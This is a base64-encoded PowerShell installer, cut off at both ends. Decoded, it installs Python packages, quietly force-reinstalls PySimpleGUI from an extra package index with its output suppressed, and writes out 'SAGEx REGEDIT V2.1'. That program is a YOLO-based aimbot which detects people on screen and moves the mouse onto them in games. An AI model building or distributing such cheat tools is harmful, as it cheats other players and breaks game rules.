VzdC1BZG1pbiB7DQogICAgJGlkZW50aXR5ID0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkNCiAgICAkcHJpbmNpcGFsID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCgkaWRlbnRpdHkpDQogICAgcmV0dXJuICRwcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLVBhY2thZ2VzIHsNCiAgICAkcGFja2FnZXMgPSBAKA0KICAgICAgICAidWx0cmFseXRpY3MiLA0KICAgICAgICAibXNzIiwNCiAgICAgICAgInB5YXV0b2d1aSIsDQogICAgICAgICJvcGVuY3YtcHl0aG9uIiwNCiAgICAgICAgInB5d2luMzIiDQogICAgKQ0KICAgIA0KICAgIFdyaXRlLUhvc3QgIlsrXSBDaGVja2luZyBQeXRob24gcGFja2FnZXMuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbg0KICAgIA0KICAgICMgQ2hlY2sgaWYgcGlwIGlzIGF2YWlsYWJsZQ0KICAgIHRyeSB7IA0KICAgICAgICAkbnVsbCA9ICYgcHl0aG9uIC1tIHBpcCAtLXZlcnNpb24gDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIHBpcCBub3QgZm91bmQuIEluc3RhbGxpbmcgcGlwLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAmIHB5dGhvbiAtbSBlbnN1cmVwaXAgLS1kZWZhdWx0LXBpcA0KICAgIH0NCiAgICANCiAgICAjIFNwZWNpYWwgUHlTaW1wbGVHVUkgaW5zdGFsbGF0aW9uIGZpcnN0DQogICAgV3JpdGUtSG9zdCAiICAtIEluc3RhbGxpbmcgUHlTaW1wbGVHVUkgZnJvbSBwcml2YXRlIHNlcnZlci4uLiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCiAgICAmIHB5dGhvbiAtbSBwaXAgdW5pbnN0YWxsIFB5U2ltcGxlR1VJIC15IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgcHl0aG9uIC1tIHBpcCBjYWNoZSBwdXJnZSAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHB5dGhvbiAtbSBwaXAgaW5zdGFsbCAtLWZvcmNlLXJlaW5zdGFsbCAtLWV4dHJhLWluZGV4LXVybCBodHRwczovL1B5U2ltcGxlR1VJLm5ldC9pbnN0YWxsIFB5U2ltcGxlR1VJIDI+JjEgfCBPdXQtTnVsbA0KICAgIA0KICAgIGZvcmVhY2ggKCRwa2cgaW4gJHBhY2thZ2VzKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIiAgLSBDaGVja2luZyAkcGtnLi4uIiAtTm9OZXdsaW5lDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkaW5zdGFsbGVkID0gJiBweXRob24gLWMgImltcG9ydCAkcGtnIiAyPiYxDQogICAgICAgICAgICBpZiAoJExBU1RFWElUQ09ERSAtZXEgMCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIiBPSyIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB0aHJvdw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIiBJbnN0YWxsaW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgJiBweXRob24gLW0gcGlwIGluc3RhbGwgJHBrZyAtLXF1aWV0IC0tZGlzYWJsZS1waXAtdmVyc2lvbi1jaGVjaw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LU1vZGVsIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRtb2RlbEZpbGUpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIA0KICAgIHRyeSB7DQogICAgICAgICRoYXNoID0gKEdldC1GaWxlSGFzaCAtQWxnb3JpdGhtIFNIQTI1NiAtUGF0aCAkbW9kZWxGaWxlKS5IYXNoDQogICAgICAgIHJldHVybiAkaGFzaCAtZXEgJG1vZGVsSGFzaA0KICAgIH0NCiAgICBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtTW9kZWwgew0KICAgIFdyaXRlLUhvc3QgIlsrXSBEb3dubG9hZGluZyBtb2RlbC4uLiIgLUZvcmVncm91bmRDb2xvciBDeWFuDQogICAgdHJ5IHsNCiAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkbW9kZWxVcmwgLU91dEZpbGUgJG1vZGVsRmlsZSAtVXNlQmFzaWNQYXJzaW5nDQogICAgICAgIGlmICgtbm90IChUZXN0LU1vZGVsKSkgew0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJG1vZGVsRmlsZSAtRm9yY2UNCiAgICAgICAgICAgIHRocm93ICJNb2RlbCB2ZXJpZmljYXRpb24gZmFpbGVkIChIYXNoIG1pc21hdGNoKSINCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gRXJyb3IgZG93bmxvYWRpbmcgbW9kZWw6ICRfIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDcmVhdGUtUHl0aG9uU2NyaXB0IHsNCiAgICBAJw0KIyBTQUdFeCBSRUdFRElUIFYyLjEgDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBjdjINCmltcG9ydCB0aW1lDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgcHlhdXRvZ3VpDQppbXBvcnQgbnVtcHkgYXMgbnANCmltcG9ydCBtc3MNCmltcG9ydCBsb2dnaW5nDQppbXBvcnQgUHlTaW1wbGVHVUkgYXMgc2cNCmZyb20gdWx0cmFseXRpY3MgaW1wb3J0IFlPTE8NCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgd2luc291bmQNCg0KIyBDb25maWd1cmF0aW9uDQpERUZBVUxUX0NPTkZJRyA9IHsNCiAgICAiY29uZmlkZW5jZSI6IDAuNSwNCiAgICAic21vb3RobmVzcyI6IDAuMzUsDQogICAgInNjYW5faW50ZXJ2YWwiOiAwLA0KICAgICJkcmFnX2RlbGF5IjogMCwNCiAgICAicmVnaW9uX3NpemUiOiAzMDAsDQogICAgImVuYWJsZV9zb3VuZCI6IFRydWUsDQogICAgImRhc2hfa2V5IjogIlZLX1NISUZUIiwNCiAgICAiZGFzaF9kdXJhdGlvbiI6IDAuMiwNCiAgICAiZGFzaF9jb29sZG93biI6IDIuMA0KfQ0KDQojIEF2YWlsYWJsZSBkYXNoIGtleXMNCkRBU0hfS0VZUyA9IHsNCiAgICAiVktfU0hJRlQiOiB3aW4zMmNvbi5WS19TSElGVCwNCiAgICAiVktfU1BBQ0UiOiB3aW4zMmNvbi5WS19TUEFDRSwNCiAgICAiVktfQ0FQSVRBTCI6IHdpbjMyY29uLlZLX0NBUElUQUwNCn0NCg0KIyBTb3VuZCBmcmVxdWVuY2llcw0KU09VTkRTID0gew0KICAgICJ0b2dnbGVfb24iOiA3ODQsDQogICAgInRvZ2dsZV9vZmYiOiA1MjMsDQogICAgInRhcmdldF9sb2NrZWQiOiA2NTksDQogICAgImRhc2hfYWN0aXZhdGVkIjogOTg4LA0KICAgICJlcnJvciI6IDM5Mg0KfQ0KDQojIEluaXRpYWxpemUNCmN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0Q29uc29sZVRpdGxlVygiU0FHRXggUkVHRURJVCBWMi4xIikNCmxvZ2dpbmcuZ2V0TG9nZ2VyKCJ1bHRyYWx5dGljcyIpLnNldExldmVsKGxvZ2dpbmcuQ1JJVElDQUwpDQpweWF1dG9ndWkuRkFJTFNBRkUgPSBGYWxzZQ0KDQpjbGFzcyBBaW1ib3RDb25maWc6DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmFjdGl2ZSA9IEZhbHNlDQogICAgICAgIHNlbGYuY29uZmlkZW5jZSA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJjb25maWRlbmNlIl0pDQogICAgICAgIHNlbGYuc21vb3RobmVzcyA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJzbW9vdGhuZXNzIl0pDQogICAgICAgIHNlbGYuc2Nhbl9pbnRlcnZhbCA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJzY2FuX2ludGVydmFsIl0pDQogICAgICAgIHNlbGYuZHJhZ19kZWxheSA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJkcmFnX2RlbGF5Il0pDQogICAgICAgIHNlbGYucmVnaW9uX3NpemUgPSBpbnQoREVGQVVMVF9DT05GSUdbInJlZ2lvbl9zaXplIl0pDQogICAgICAgIHNlbGYuZW5hYmxlX3NvdW5kID0gYm9vbChERUZBVUxUX0NPTkZJR1siZW5hYmxlX3NvdW5kIl0pDQogICAgICAgIHNlbGYuZGFzaF9rZXkgPSBzdHIoREVGQVVMVF9DT05GSUdbImRhc2hfa2V5Il0pDQogICAgICAgIHNlbGYuZGFzaF9kdXJhdGlvbiA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJkYXNoX2R1cmF0aW9uIl0pDQogICAgICAgIHNlbGYuZGFzaF9jb29sZG93biA9IGZsb2F0KERFRkFVTFRfQ09ORklHWyJkYXNoX2Nvb2xkb3duIl0pDQogICAgICAgIHNlbGYubGFzdF9kYXNoX3RpbWUgPSAwDQogICAgICAgIHNlbGYudXBkYXRlX3NjcmVlbl9wYXJhbXMoKQ0KICAgICAgICANCiAgICBkZWYgdXBkYXRlX3NjcmVlbl9wYXJhbXMoc2VsZik6DQogICAgICAgIHNlbGYuc2NyZWVuX3dpZHRoLCBzZWxmLnNjcmVlbl9oZWlnaHQgPSBweWF1dG9ndWkuc2l6ZSgpDQogICAgICAgIHNlbGYucmVnaW9uX2xlZnQgPSBpbnQoc2VsZi5zY3JlZW5fd2lkdGggLy8gMiAtIHNlbGYucmVnaW9uX3NpemUgLy8gMikNCiAgICAgICAgc2VsZi5yZWdpb25fdG9wID0gaW50KHNlbGYuc2NyZWVuX2hlaWdodCAvLyAyIC0gc2VsZi5yZWdpb25fc2l6ZSAvLyAyKQ0KICAgICAgICBzZWxmLnNjcmVlbl9yZWdpb24gPSB7DQogICAgICAgICAgICAidG9wIjogc2VsZi5yZWdpb25fdG9wLA0KICAgICAgICAgICAgImxlZnQiOiBzZWxmLnJlZ2lvbl9sZWZ0LA0KICAgICAgICAgICAgIndpZHRoIjogc2VsZi5yZWdpb25fc2l6ZSwNCiAgICAgICAgICAgICJoZWlnaHQiOiBzZWxmLnJlZ2lvbl9zaXplDQogICAgICAgIH0NCiAgICANCiAgICBkZWYgcGxheV9zb3VuZChzZWxmLCBzb3VuZF90eXBlKToNCiAgICAgICAgaWYgc2VsZi5lbmFibGVfc291bmQgYW5kIHNvdW5kX3R5cGUgaW4gU09VTkRTOg0KICAgICAgICAgICAgd2luc291bmQuQmVlcChTT1VORFNbc291bmRfdHlwZV0sIDE1MCkNCg0KZGVmIGNyZWF0ZV9ndWkoY29uZmlnKToNCiAgICBzZy50aGVtZSgnRGFya0dyZXk1JykNCiAgICANCiAgICBkYXNoX2tleV9vcHRpb25zID0gbGlzdChEQVNIX0tFWVMua2V5cygpKQ0KICAgIA0KICAgIGxheW91dCA9IFsNCiAgICAgICAgW3NnLlRleHQoIlNBR0V4IFJFR0VESVQgVjIuMSAtIEZpeGVkIiwgZm9udD0oJ0hlbHZldGljYScsIDE2KSldLA0KICAgICAgICBbc2cuSG9yaXpvbnRhbFNlcGFyYXRvcigpXSwNCiAgICAgICAgWw0KICAgICAgICAgICAgc2cuQ29sdW1uKFsNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiQ29uZmlkZW5jZSBUaHJlc2hvbGQ6Iiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuU2xpZGVyKCgwLjEsIDAuOSksIGNvbmZpZy5jb25maWRlbmNlLCAwLjA1LCBvcmllbnRhdGlvbj0naCcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk9Jy1DT05GSURFTkNFLScsIHNpemU9KDMwLDE1KSldLA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJTbW9vdGhuZXNzOiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlNsaWRlcigoMC4xLCAxLjApLCBjb25maWcuc21vb3RobmVzcywgMC4wNSwgb3JpZW50YXRpb249J2gnLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAga2V5PSctU01PT1RITkVTUy0nLCBzaXplPSgzMCwxNSkpXSwNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiUmVnaW9uIFNpemU6Iiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuU2xpZGVyKCgxMDAsIDUwMCksIGNvbmZpZy5yZWdpb25fc2l6ZSwgMTAsIG9yaWVudGF0aW9uPSdoJywgDQogICAgICAgICAgICAgICAgICAgICAgICAgIGtleT0nLVJFR0lPTi0nLCBzaXplPSgzMCwxNSksIGVuYWJsZV9ldmVudHM9VHJ1ZSldLA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtzZy5DaGVja2JveCgiRW5hYmxlIFNvdW5kIiwgZGVmYXVsdD1jb25maWcuZW5hYmxlX3NvdW5kLCBrZXk9Jy1TT1VORC0nKV0sDQogICAgICAgICAgICBdKSwNCiAgICAgICAgICAgIHNnLlZlcnRpY2FsU2VwYXJhdG9yKCksDQogICAgICAgICAgICBzZy5Db2x1bW4oWw0KICAgICAgICAgICAgICAgIFtzZy5CdXR0b24oIlRvZ2dsZSBPTi9PRkYgKEY2KSIsIHNpemU9KDIwLDIpLCBrZXk9Jy1UT0dHTEUtJyldLA0KICAgICAgICAgICAgICAgIFtzZy5CdXR0b24oIkRhc2ggKEY3KSIsIHNpemU9KDIwLDIpLCBrZXk9Jy1EQVNILScpXSwNCiAgICAgICAgICAgICAgICBbc2cuQnV0dG9uKCJFeGl0IChGOCkiLCBzaXplPSgyMCwyKSwga2V5PSctRVhJVC0nKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIlN0YXR1czoiLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJJTkFDVElWRSIsIGtleT0nLVNUQVRVUy0nLCB0ZXh0X2NvbG9yPSdyZWQnLCBzaXplPSgyMCwxKSwgDQogICAgICAgICAgICAgICAgICAgICAgICBmb250PSgnSGVsdmV0aWNhJywgMTIpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkRhc2ggQ29vbGRvd246Iiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuUHJvZ3Jlc3NCYXIoMTAwLCBvcmllbnRhdGlvbj0naCcsIHNpemU9KDIwLDEwKSwga2V5PSctREFTSENPT0xET1dOLScpXSwNCiAgICAgICAgICAgIF0pDQogICAgICAgIF0sDQogICAgICAgIFtzZy5Ib3Jpem9udGFsU2VwYXJhdG9yKCldLA0KICAgICAgICBbDQogICAgICAgICAgICBzZy5Db2x1bW4oWw0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJEYXNoIFNldHRpbmdzIiwgZm9udD0oJ0hlbHZldGljYScsIDEyKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJEYXNoIEtleToiLCBzaXplPSgxMiwxKSksIA0KICAgICAgICAgICAgICAgICBzZy5Db21ibyhkYXNoX2tleV9vcHRpb25zLCBkZWZhdWx0X3ZhbHVlPWNvbmZpZy5kYXNoX2tleSwga2V5PSctREFTSEtFWS0nKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkR1cmF0aW9uIChzKToiLCBzaXplPSgxMiwxKSksDQogICAgICAgICAgICAgICAgIHNnLlNsaWRlcigoMC4xLCAxLjApLCBjb25maWcuZGFzaF9kdXJhdGlvbiwgMC4xLCBvcmllbnRhdGlvbj0naCcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk9Jy1EQVNIRFVSQVRJT04tJywgc2l6ZT0oMTUsMTUpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkNvb2xkb3duIChzKToiLCBzaXplPSgxMiwxKSksDQogICAgICAgICAgICAgICAgIHNnLlNsaWRlcigoMC41LCA1LjApLCBjb25maWcuZGFzaF9jb29sZG93biwgMC4xLCBvcmllbnRhdGlvbj0naCcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk9Jy1EQVNIQ09PTERPV05fU0xJREVSLScsIHNpemU9KDE1LDE1KSldLA0KICAgICAgICAgICAgXSksDQogICAgICAgICAgICBzZy5WZXJ0aWNhbFNlcGFyYXRvcigpLA0KICAgICAgICAgICAgc2cuQ29sdW1uKFsNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiSG90a2V5czoiLCBmb250PSgnSGVsdmV0aWNhJywgMTIpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkY2OiBUb2dnbGUgQWltYm90Iiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiRjc6IERhc2giLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJGODogRXhpdCBQcm9ncmFtIiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiTE1COiBIb2xkIHRvIEFpbSIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkNUUkw6IFF1aWNrIERhc2giLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCIiLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJTb3VuZHM6IiwgZm9udD0oJ0hlbHZldGljYScsIDEyKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJIaWdoOiBEcmFnIEFzc2lzdCBPbiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIk1lZGl1bTogVGFyZ2V0IExvY2siLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJMb3c6IERyYWcgQXNzaXN0IE9mZiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICBdKQ0KICAgICAgICBdDQogICAgXQ0KICAgIA0KICAgIHdpbmRvdyA9IHNnLldpbmRvdygiU0FHRXggUkVHRURJVCBWMi4xIENPTlRST0wgUEFORUwiLCBsYXlvdXQsIGZpbmFsaXplPVRydWUpDQogICAgcmV0dXJuIHdpbmRvdw0KDQpkZWYgaXNfcHJlc3NlZChrKTogDQogICAgcmV0dXJuIHdpbjMyYXBpLkdldEFzeW5jS2V5U3RhdGUoaykgJiAweDgwMDANCg0KZGVmIGxtYl9oZWxkKCk6IA0KICAgIHJldHVybiBpc19wcmVzc2VkKHdpbjMyY29uLlZLX0xCVVRUT04pDQoNCmRlZiBybWJfaGVsZCgpOiANCiAgICByZXR1cm4gaXNfcHJlc3NlZCh3aW4zMmNvbi5WS19SQlVUVE9OKQ0KDQpkZWYgbW92ZV92aXJ0dWFsKHgsIHkpOiANCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5tb3VzZV9ldmVudCgweDAwMDEsIGludCh4KSwgaW50KHkpLCAwLCAwKQ0KDQpkZWYgZGV0ZWN0X2VuZW15KGNvbmZpZywgbW9kZWwpOg0KICAgIHRyeToNCiAgICAgICAgcmVnaW9uID0gew0KICAgICAgICAgICAgInRvcCI6IGludChjb25maWcuc2NyZWVuX3JlZ2lvblsidG9wIl0pLA0KICAgICAgICAgICAgImxlZnQiOiBpbnQoY29uZmlnLnNjcmVlbl9yZWdpb25bImxlZnQiXSksDQogICAgICAgICAgICAid2lkdGgiOiBpbnQoY29uZmlnLnNjcmVlbl9yZWdpb25bIndpZHRoIl0pLA0KICAgICAgICAgICAgImhlaWdodCI6IGludChjb25maWcuc2NyZWVuX3JlZ2lvblsiaGVpZ2h0Il0pDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHdpdGggbXNzLm1zcygpIGFzIHNjdDoNCiAgICAgICAgICAgIGltZyA9IG5wLmFycmF5KHNjdC5ncmFiKHJlZ2lvbikpDQogICAgICAgICAgICBpbWcgPSBjdjIuY3Z0Q29sb3IoaW1nLCBjdjIuQ09MT1JfQkdSQTJCR1IpDQoNCiAgICAgICAgcmVzdWx0cyA9IG1vZGVsKGltZywgY29uZj1jb25maWcuY29uZmlkZW5jZSwgdmVyYm9zZT1GYWxzZSkNCiAgICAgICAgYm94ZXMgPSByZXN1bHRzWzBdLmJveGVzLnh5eHkuY3B1KCkubnVtcHkoKQ0KICAgICAgICBjbGFzc2VzID0gcmVzdWx0c1swXS5ib3hlcy5jbHMuY3B1KCkubnVtcHkoKQ0KDQogICAgICAgIGJlc3RfdGFyZ2V0ID0gTm9uZQ0KICAgICAgICBiZXN0X2NvbmYgPSAwDQoNCiAgICAgICAgZm9yIGksIGJveCBpbiBlbnVtZXJhdGUoYm94ZXMpOg0KICAgICAgICAgICAgY2xhc3NfaWQgPSBpbnQoY2xhc3Nlc1tpXSkNCiAgICAgICAgICAgIGlmIGNsYXNzX2lkID09IDA6ICAjIFBlcnNvbiBjbGFzcw0KICAgICAgICAgICAgICAgIHgxLCB5MSwgeDIsIHkyID0gbWFwKGludCwgYm94KQ0KICAgICAgICAgICAgICAgIGNvbmYgPSByZXN1bHRzWzBdLmJveGVzLmNvbmZbaV0NCiAgICAgICAgICAgICAgICBjeCA9IGNvbmZpZy5yZWdpb25fbGVmdCArICh4MSArIHgyKSAvLyAyDQogICAgICAgICAgICAgICAgY3kgPSBjb25maWcucmVnaW9uX3RvcCArIGludCh5MSArICh5MiAtIHkxKSAqIDAuMikNCiAgICAgICAgICAgICAgICBpZiBjb25mID4gYmVzdF9jb25mOg0KICAgICAgICAgICAgICAgICAgICBiZXN0X3RhcmdldCA9IChjeCwgY3kpDQogICAgICAgICAgICAgICAgICAgIGJlc3RfY29uZiA9IGNvbmYNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgIGlmIGJlc3RfdGFyZ2V0Og0KICAgICAgICAgICAgY29uZmlnLnBsYXlfc291bmQoInRhcmdldF9sb2NrZWQiKQ0KICAgICAgICAgICAgDQogICAgICAgIHJldHVybiBiZXN0X3RhcmdldA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZiJbRVJST1JdIERldGVjdGlvbiBmYWlsZWQ6IHtzdHIoZSl9IikNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KZGVmIHNtb290aF9haW1fdG8oY29uZmlnLCB0YXJnZXRfeCwgdGFyZ2V0X3kpOg0KICAgIHRyeToNCiAgICAgICAgY3gsIGN5ID0gcHlhdXRvZ3VpLnBvc2l0aW9uKCkNCiAgICAgICAgZHggPSB0YXJnZXRfeCAtIGN4DQogICAgICAgIGR5ID0gdGFyZ2V0X3kgLSBjeQ0KICAgICAgICBzdGVwcyA9IG1heChpbnQobnAuaHlwb3QoZHgsIGR5KSAvIG1heChjb25maWcuc21vb3RobmVzcywgMC4xKSAvLyAxLjUpLCAxKQ0KICAgICAgICANCiAgICAgICAgZm9yIF8gaW4gcmFuZ2Uoc3RlcHMpOg0KICAgICAgICAgICAgaWYgbm90IGxtYl9oZWxkKCk6DQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICBteCA9IGludChkeCAvIHN0ZXBzKQ0KICAgICAgICAgICAgbXkgPSBpbnQoZHkgLyBzdGVwcykNCiAgICAgICAgICAgIG1vdmVfdmlydHVhbChteCwgbXkpDQogICAgICAgICAgICB0aW1lLnNsZWVwKG1heChjb25maWcuZHJhZ19kZWxheSwgMC4wMSkpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludChmIltFUlJPUl0gQWltaW5nIGZhaWxlZDoge3N0cihlKX0iKQ0KDQpkZWYgcGVyZm9ybV9kYXNoKGNvbmZpZyk6DQogICAgY3VycmVudF90aW1lID0gdGltZS50aW1lKCkNCiAgICBpZiBjdXJyZW50X3RpbWUgLSBjb25maWcubGFzdF9kYXNoX3RpbWUgPCBjb25maWcuZGFzaF9jb29sZG93bjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgICAgIA0KICAgIHRyeToNCiAgICAgICAga2V5X2NvZGUgPSBEQVNIX0tFWVNbY29uZmlnLmRhc2hfa2V5XQ0KICAgICAgICB3aW4zMmFwaS5rZXliZF9ldmVudChrZXlfY29kZSwgMCwgMCwgMCkNCiAgICAgICAgdGltZS5zbGVlcChjb25maWcuZGFzaF9kdXJhdGlvbikNCiAgICAgICAgd2luMzJhcGkua2V5YmRfZXZlbnQoa2V5X2NvZGUsIDAsIHdpbjMyY29uLktFWUVWRU5URl9LRVlVUCwgMCkNCiAgICAgICAgDQogICAgICAgIGNvbmZpZy5sYXN0X2Rhc2hfdGltZSA9IGN1cnJlbnRfdGltZQ0KICAgICAgICBjb25maWcucGxheV9zb3VuZCgiZGFzaF9hY3RpdmF0ZWQiKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZiJbRVJST1JdIERhc2ggZmFpbGVkOiB7c3RyKGUpfSIpDQogICAgICAgIGNvbmZpZy5wbGF5X3NvdW5kKCJlcnJvciIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgbWFpbigpOg0KICAgIHRyeToNCiAgICAgICAgY29uZmlnID0gQWltYm90Q29uZmlnKCkNCiAgICAgICAgbW9kZWwgPSBZT0xPKCJ5b2xvdjhuLnB0IikNCiAgICAgICAgd2luZG93ID0gY3JlYXRlX2d1aShjb25maWcpDQogICAgICAgIGxhc3RfdG9nZ2xlID0gMA0KICAgICAgICANCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIGV2ZW50LCB2YWx1ZXMgPSB3aW5kb3cucmVhZCh0aW1lb3V0PTEwKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiBldmVudCA9PSBzZy5XSU5fQ0xPU0VEIG9yIGV2ZW50ID09ICctRVhJVC0nIG9yIGlzX3ByZXNzZWQod2luMzJjb24uVktfRjEwKToNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGV2ZW50ID09ICctVE9HR0xFLScgb3IgaXNfcHJlc3NlZCh3aW4zMmNvbi5WS19GNikpIGFuZCB0aW1lLnRpbWUoKSAtIGxhc3RfdG9nZ2xlID4gMC41Og0KICAgICAgICAgICAgICAgIGNvbmZpZy5hY3RpdmUgPSBub3QgY29uZmlnLmFjdGl2ZQ0KICAgICAgICAgICAgICAgIHN0YXR1c190ZXh0ID0gIkFDVElWRSIgaWYgY29uZmlnLmFjdGl2ZSBlbHNlICJJTkFDVElWRSINCiAgICAgICAgICAgICAgICBzdGF0dXNfY29sb3IgPSAnZ3JlZW4nIGlmIGNvbmZpZy5hY3RpdmUgZWxzZSAncmVkJw0KICAgICAgICAgICAgICAgIHdpbmRvd1snLVNUQVRVUy0nXS51cGRhdGUoc3RhdHVzX3RleHQsIHRleHRfY29sb3I9c3RhdHVzX2NvbG9yKQ0KICAgICAgICAgICAgICAgIGNvbmZpZy5wbGF5X3NvdW5kKCJ0b2dnbGVfb24iIGlmIGNvbmZpZy5hY3RpdmUgZWxzZSAidG9nZ2xlX29mZiIpDQogICAgICAgICAgICAgICAgbGFzdF90b2dnbGUgPSB0aW1lLnRpbWUoKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoZXZlbnQgPT0gJy1EQVNILScgb3IgaXNfcHJlc3NlZCh3aW4zMmNvbi5WS19GNykgb3IgaXNfcHJlc3NlZCh3aW4zMmNvbi5WS19DT05UUk9MKSkgYW5kIHRpbWUudGltZSgpIC0gbGFzdF90b2dnbGUgPiAwLjU6DQogICAgICAgICAgICAgICAgaWYgcGVyZm9ybV9kYXNoKGNvbmZpZyk6DQogICAgICAgICAgICAgICAgICAgIHdpbmRvd1snLURBU0hDT09MRE9XTi0nXS51cGRhdGUoMCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29vbGRvd25fcmVtYWluaW5nID0gbWF4KDAsIGNvbmZpZy5kYXNoX2Nvb2xkb3duIC0gKHRpbWUudGltZSgpIC0gY29uZmlnLmxhc3RfZGFzaF90aW1lKSkNCiAgICAgICAgICAgIGNvb2xkb3duX3BlcmNlbnQgPSBpbnQoMTAwIC0gKGNvb2xkb3duX3JlbWFpbmluZyAvIGNvbmZpZy5kYXNoX2Nvb2xkb3duICogMTAwKSkNCiAgICAgICAgICAgIHdpbmRvd1s